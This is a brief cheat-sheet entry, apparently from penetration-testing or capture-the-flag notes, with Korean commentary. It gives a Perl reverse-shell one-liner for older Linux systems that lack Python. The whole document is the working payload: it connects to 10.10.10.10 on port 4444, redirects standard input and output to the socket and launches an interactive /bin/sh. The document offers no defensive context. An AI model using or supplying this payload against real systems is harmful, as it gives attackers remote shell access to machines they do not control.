# linux perl reverse shell

python이 없는 오래된 시스템에서. perl은 거의 모든 배포판에 기본 설치되어 있다.

```bash
perl -e 'use Socket;$i="10.10.10.10";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
